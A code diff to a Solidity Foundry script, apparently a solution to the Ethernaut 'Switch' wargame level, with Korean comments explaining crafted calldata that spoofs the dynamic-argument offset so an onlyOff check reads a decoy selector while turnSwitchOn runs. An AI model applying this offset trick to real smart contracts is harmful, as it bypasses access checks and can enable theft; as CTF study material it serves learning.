@@ -15,11 +15,11 @@ contract SwitchScript is Script {
 
         (bool ok, ) = SWITCH.call(
             abi.encodePacked(
-                Switch.flipSwitch.selector,                  // [0..3]   flipSwitch(bytes) 셀렉터(4B)
-                abi.encode(96),                              // [4..35]  _data offset = 96(0x60) (32B)
-                abi.encode(0x00),                            // [36..67] 더미 32B (패딩, 디코더는 안봄)
-                abi.encode(offSelector),                     // [68..99] 32B: 앞 4B에 offSelector → onlyOff 검사용 미끼 OK
-                abi.encode(4),                               // [100..131] _data length = 4 (bytes 규칙)
+                Switch.flipSwitch.selector,                       // [0..3]   flipSwitch(bytes) 셀렉터(4B) -> 동적 인수이므로 1. selector, 2. offset, 3. length, 4. data
+                abi.encode(96),                                   // [4..35]  96바이트뒤에(132바이트) 진짜 데이터 시작이라고 거짓말침 -> offset부분
+                abi.encode(0x00),                                 // [36..67] 원래 length 부분은 더미로 채움
+                abi.encode(offSelector),                          // [68..99] 32B 중 앞 4B에 offSelector 라고 명시하여 onlyOff()에 require 문 통과
+                abi.encode(4),                                    // [100..131] 위에서 132바이트부터 실제 데이터가 시작이라고 명시해 뒀으니 직전에는 length가 존재해야해서 4라는 값으로 채움
                 abi.encodeWithSelector(Switch.turnSwitchOn.selector) // [132..135] _data 실제 값(4B)
             )
         );
